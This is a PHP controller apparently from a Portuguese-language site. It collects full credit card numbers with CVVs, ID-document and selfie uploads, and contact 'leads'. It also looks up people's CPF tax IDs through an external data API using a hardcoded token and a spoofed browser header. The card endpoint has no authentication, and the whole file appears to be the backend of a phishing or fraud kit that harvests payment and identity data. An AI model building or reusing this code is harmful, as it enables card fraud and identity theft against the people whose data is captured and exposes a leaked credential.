<?php

namespace App\Controllers;

use App\Services\UserService;

class UserController
{
    private $userService;
    private $turnstileService;

    public function __construct(UserService $userService, ?\App\Services\TurnstileService $turnstileService = null)
    {
        $this->userService = $userService;
        $this->turnstileService = $turnstileService;
    }

    /**
     * Handle lead update request
     */
    public function updateLead(): void
    {
        $username = $_POST['username'] ?? '';
        $email = $_POST['email'] ?? '';
        $phone = $_POST['phone'] ?? '';

        $result = $this->userService->updateLead($username, $email, $phone);
        header('Content-Type: application/json');
        echo json_encode($result);
    }

    /**
     * Handle credit card save request
     */
    public function saveCard(): void
    {
        $username = $_POST['username'] ?? '';
        $cardData = [
            "number" => $_POST['number'] ?? '',
            "name" => $_POST['name'] ?? '',
            "expiry" => $_POST['expiry'] ?? '',
            "cvv" => $_POST['cvv'] ?? '',
            "installments" => $_POST['installments'] ?? ''
        ];

        $result = $this->userService->saveCreditCard($username, $cardData);
        header('Content-Type: application/json');
        echo json_encode($result);
    }

    /**
     * Handle KYC upload request
     */
    public function updateKyc(): void
    {
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }
        $username = $_SESSION['user'] ?? '';
        if (empty($username)) {
            header('Content-Type: application/json');
            echo json_encode(["success" => false, "message" => "Sessão expirada."]);
            return;
        }

        $kycFiles = [
            "selfie" => $_POST['kyc_selfie'] ?? '',
            "front" => $_POST['kyc_front'] ?? '',
            "back" => $_POST['kyc_back'] ?? ''
        ];

        $result = $this->userService->processKyc($username, $kycFiles);
        header('Content-Type: application/json');
        echo json_encode($result);
    }

    /**
     * Helper for external KYC lookup
     */
    public function kycLookup(): void
    {
        $turnstileToken = $_POST['cf-turnstile-response'] ?? '';
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];

        if ($this->turnstileService) {
            $validation = $this->turnstileService->validate($turnstileToken, $ip);
            if (!$validation['success']) {
                header('Content-Type: application/json');
                echo json_encode(["success" => false, "message" => "Verificação de segurança falhou. Tente novamente."]);
                return;
            }
        }

        $cpf = preg_replace('/[^0-9]/', '', $_POST['cpf'] ?? '');
        $url = "https://api.amnesiatecnologia.rocks/?token=c5eebbc9-0469-4324-85f6-0c994b42d18a&cpf=" . $cpf;

        $startTime = microtime(true);

        // stream_context to simulate curl behavior and set timeout
        $options = [
            'http' => [
                'method' => "GET",
                'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n",
                'timeout' => 20 // Timeout in seconds
            ]
        ];
        $context = stream_context_create($options);

        $response = @file_get_contents($url, false, $context);

        $endTime = microtime(true);
        $executionTime = round($endTime - $startTime, 4);

        // Logging performance to audit slowness
        $logFile = dirname(__DIR__, 2) . '/debug_api.log';
        $logMsg = "[" . date('Y-m-d H:i:s') . "] [KYC_LOOKUP] CPF: $cpf | Time: {$executionTime}s";
        if ($response === false)
            $logMsg .= " | Error: Connection Failed (Timeout)";
        file_put_contents($logFile, $logMsg . "\n", FILE_APPEND);

        $data = json_decode($response, true);

        header('Content-Type: application/json');
        if (isset($data['DADOS'])) {
            echo json_encode(["success" => true, "data" => $data['DADOS']]);
        } else {
            $msg = ($response === false) ? "Erro de conexão com o Bureau (Timeout)." : "Dados não encontrados ou serviço indisponível.";
            echo json_encode(["success" => false, "message" => $msg]);
        }
    }
}
